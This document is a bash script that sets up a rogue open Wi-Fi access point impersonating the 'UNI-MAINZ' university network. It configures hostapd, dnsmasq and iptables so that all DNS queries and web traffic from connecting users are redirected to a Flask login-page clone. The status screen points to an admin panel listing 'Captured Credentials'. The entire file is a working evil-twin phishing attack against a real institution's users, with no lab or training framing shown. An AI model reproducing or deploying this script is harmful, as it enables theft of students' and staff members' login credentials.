#!/bin/bash

# Rogue Captive Portal Setup Script (Non-systemd version)
# This version works on systems without systemd (WSL1, older Linux, etc.)
# For use on actual Kali Linux with systemd, use setup_rogue_ap.sh instead

# Variables
SSID="UNI-MAINZ"
INTERFACE="wlan0"
ETHERNET="eth0"
GATEWAY_IP="192.168.10.1"
DHCP_RANGE_START="192.168.10.10"
DHCP_RANGE_END="192.168.10.100"
FLASK_PORT=8080
DOMAIN="login.uni-mainz.de"

# Process tracking
HOSTAPD_PID=""
DNSMASQ_PID=""
FLASK_PID=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root${NC}" 
   exit 1
fi

# Function to print status messages
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Install necessary packages
install_dependencies() {
    print_status "Installing dependencies..."
    
    # Detect package manager
    if command -v apt-get &> /dev/null; then
        apt-get update
        apt-get install -y hostapd dnsmasq iptables python3 python3-pip python3-venv iproute2 wireless-tools
    elif command -v yum &> /dev/null; then
        yum install -y hostapd dnsmasq iptables python3 python3-pip iproute wireless-tools
    else
        print_error "Could not detect package manager (apt/yum)"
        exit 1
    fi
    
    print_status "Dependencies installed"
}

# Configure hostapd (Wi-Fi Access Point)
configure_hostapd() {
    print_status "Configuring hostapd..."
    
    cat <<EOF > /tmp/hostapd_rogue.conf
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF
    
    print_status "hostapd configured"
}

# Configure dnsmasq (DHCP and DNS server)
configure_dnsmasq() {
    print_status "Configuring dnsmasq..."
    
    cat <<EOF > /tmp/dnsmasq_rogue.conf
# Interface to bind to
interface=$INTERFACE

# DHCP range
dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,255.255.255.0,12h

# Gateway
dhcp-option=3,$GATEWAY_IP

# DNS Server
dhcp-option=6,$GATEWAY_IP

# Redirect all DNS queries to our IP
address=/#/$GATEWAY_IP

# Log queries
log-queries
log-dhcp

# Don't read /etc/resolv.conf
no-resolv

# Don't poll /etc/resolv.conf
no-poll

# PID file
pid-file=/tmp/dnsmasq_rogue.pid
EOF

    print_status "dnsmasq configured"
}

# Configure network interface
configure_network() {
    print_status "Configuring network interface..."
    
    # Check if interface exists
    if ! ip link show $INTERFACE &> /dev/null; then
        print_error "Interface $INTERFACE not found!"
        print_warning "Available interfaces:"
        ip link show | grep -E "^[0-9]+:" | awk '{print $2}' | sed 's/:$//'
        exit 1
    fi
    
    # Kill any processes using the interface
    pkill -9 wpa_supplicant 2>/dev/null
    pkill -9 dhclient 2>/dev/null
    
    # Bring down the interface
    ip link set dev $INTERFACE down
    
    # Remove any existing IP addresses
    ip addr flush dev $INTERFACE
    
    # Bring interface up
    ip link set dev $INTERFACE up
    
    # Assign static IP
    ip addr add $GATEWAY_IP/24 dev $INTERFACE
    
    print_status "Network interface configured with IP $GATEWAY_IP"
}

# Enable IP forwarding and configure iptables
configure_iptables() {
    print_status "Configuring iptables and IP forwarding..."
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Flush existing rules
    iptables -F
    iptables -t nat -F
    iptables -t mangle -F
    iptables -X
    
    # Allow established connections
    iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    
    # Allow traffic on loopback
    iptables -A INPUT -i lo -j ACCEPT
    
    # Allow DHCP and DNS
    iptables -A INPUT -p udp --dport 67 -j ACCEPT
    iptables -A INPUT -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -p tcp --dport 53 -j ACCEPT
    
    # Allow HTTP/HTTPS traffic to our Flask app
    iptables -A INPUT -p tcp --dport 80 -j ACCEPT
    iptables -A INPUT -p tcp --dport 443 -j ACCEPT
    iptables -A INPUT -p tcp --dport $FLASK_PORT -j ACCEPT
    
    # Redirect all HTTP traffic to our Flask app
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port $FLASK_PORT
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port $FLASK_PORT
    
    # NAT for internet access (commented out - no internet by default)
    # iptables -t nat -A POSTROUTING -o $ETHERNET -j MASQUERADE
    
    print_status "iptables configured"
}

# Start hostapd
start_hostapd() {
    print_status "Starting hostapd..."
    
    # Kill any existing hostapd
    pkill -9 hostapd 2>/dev/null
    sleep 1
    
    # Start hostapd in background
    hostapd -B /tmp/hostapd_rogue.conf > /tmp/hostapd.log 2>&1
    
    sleep 2
    
    # Check if running
    if pgrep hostapd > /dev/null; then
        HOSTAPD_PID=$(pgrep hostapd)
        print_status "hostapd started (PID: $HOSTAPD_PID)"
    else
        print_error "hostapd failed to start"
        cat /tmp/hostapd.log
        exit 1
    fi
}

# Start dnsmasq
start_dnsmasq() {
    print_status "Starting dnsmasq..."
    
    # Kill any existing dnsmasq
    pkill -9 dnsmasq 2>/dev/null
    sleep 1
    
    # Start dnsmasq
    dnsmasq -C /tmp/dnsmasq_rogue.conf > /tmp/dnsmasq.log 2>&1
    
    sleep 2
    
    # Check if running
    if pgrep dnsmasq > /dev/null; then
        DNSMASQ_PID=$(pgrep dnsmasq)
        print_status "dnsmasq started (PID: $DNSMASQ_PID)"
    else
        print_error "dnsmasq failed to start"
        cat /tmp/dnsmasq.log
        exit 1
    fi
}

# Setup Flask application
setup_flask() {
    print_status "Setting up Flask application..."
    
    SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
    
    # Check if virtual environment exists
    if [ ! -d "$SCRIPT_DIR/.venv" ]; then
        print_warning "Virtual environment not found. Creating one..."
        python3 -m venv "$SCRIPT_DIR/.venv"
        "$SCRIPT_DIR/.venv/bin/pip" install flask
    fi
    
    print_status "Flask environment ready"
}

# Start Flask application
start_flask() {
    print_status "Starting Flask application..."
    
    SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
    
    # Kill any existing Flask processes
    pkill -9 -f "app.py" 2>/dev/null
    sleep 1
    
    # Start Flask in background
    cd "$SCRIPT_DIR"
    nohup .venv/bin/python3 app.py > /tmp/flask_rogue.log 2>&1 &
    FLASK_PID=$!
    
    sleep 3
    
    if ps -p $FLASK_PID > /dev/null; then
        print_status "Flask application started (PID: $FLASK_PID)"
    else
        print_error "Flask application failed to start"
        cat /tmp/flask_rogue.log
        exit 1
    fi
}

# Display status
show_status() {
    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  Rogue Captive Portal Status${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "SSID: ${YELLOW}$SSID${NC}"
    echo -e "Gateway IP: ${YELLOW}$GATEWAY_IP${NC}"
    echo -e "DHCP Range: ${YELLOW}$DHCP_RANGE_START - $DHCP_RANGE_END${NC}"
    echo -e "Flask Port: ${YELLOW}$FLASK_PORT${NC}"
    echo ""
    echo -e "${GREEN}Services:${NC}"
    pgrep hostapd > /dev/null && echo -e "  hostapd: ${GREEN}RUNNING${NC} (PID: $(pgrep hostapd))" || echo -e "  hostapd: ${RED}STOPPED${NC}"
    pgrep dnsmasq > /dev/null && echo -e "  dnsmasq: ${GREEN}RUNNING${NC} (PID: $(pgrep dnsmasq))" || echo -e "  dnsmasq: ${RED}STOPPED${NC}"
    ps -p $FLASK_PID > /dev/null 2>&1 && echo -e "  Flask: ${GREEN}RUNNING${NC} (PID: $FLASK_PID)" || echo -e "  Flask: ${RED}STOPPED${NC}"
    echo ""
    echo -e "${GREEN}Network Interface:${NC}"
    ip addr show $INTERFACE | grep "inet " | awk '{print "  IP: " $2}'
    echo ""
    echo -e "${GREEN}Admin Panel:${NC} http://$GATEWAY_IP:$FLASK_PORT/admin"
    echo -e "${GREEN}Captured Credentials:${NC} Check the admin panel"
    echo ""
    echo -e "${GREEN}Logs:${NC}"
    echo -e "  hostapd: /tmp/hostapd.log"
    echo -e "  dnsmasq: /tmp/dnsmasq.log"
    echo -e "  Flask: /tmp/flask_rogue.log"
    echo ""
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
    echo -e "${GREEN}========================================${NC}"
}

# Cleanup function
cleanup() {
    echo ""
    print_warning "Stopping services..."
    
    # Kill processes
    if [ ! -z "$HOSTAPD_PID" ]; then
        kill $HOSTAPD_PID 2>/dev/null
    fi
    pkill -9 hostapd 2>/dev/null
    
    if [ ! -z "$DNSMASQ_PID" ]; then
        kill $DNSMASQ_PID 2>/dev/null
    fi
    pkill -9 dnsmasq 2>/dev/null
    
    if [ ! -z "$FLASK_PID" ]; then
        kill $FLASK_PID 2>/dev/null
    fi
    pkill -9 -f "app.py" 2>/dev/null
    
    # Restore network
    ip addr flush dev $INTERFACE 2>/dev/null
    ip link set dev $INTERFACE down 2>/dev/null
    
    # Flush iptables
    iptables -F
    iptables -t nat -F
    
    # Remove temp files
    rm -f /tmp/hostapd_rogue.conf
    rm -f /tmp/dnsmasq_rogue.conf
    rm -f /tmp/dnsmasq_rogue.pid
    
    print_status "Cleanup complete"
    exit 0
}

# Trap Ctrl+C
trap cleanup EXIT INT TERM

# Main function
main() {
    echo -e "${GREEN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║   Rogue Captive Portal Setup          ║"
    echo "║   UNI-MAINZ Login Clone               ║"
    echo "║   (Non-systemd version)               ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
    
    print_warning "This version is for systems without systemd"
    print_warning "For Kali Linux with systemd, use setup_rogue_ap.sh"
    echo ""
    
    install_dependencies
    configure_network
    configure_hostapd
    configure_dnsmasq
    configure_iptables
    setup_flask
    start_hostapd
    start_dnsmasq
    start_flask
    show_status
    
    # Keep script running and monitor services
    while true; do
        # Check if services are still running
        if ! pgrep hostapd > /dev/null; then
            print_error "hostapd died! Restarting..."
            start_hostapd
        fi
        
        if ! pgrep dnsmasq > /dev/null; then
            print_error "dnsmasq died! Restarting..."
            start_dnsmasq
        fi
        
        if ! ps -p $FLASK_PID > /dev/null 2>&1; then
            print_error "Flask died! Restarting..."
            start_flask
        fi
        
        sleep 10
    done
}

# Run main function
main
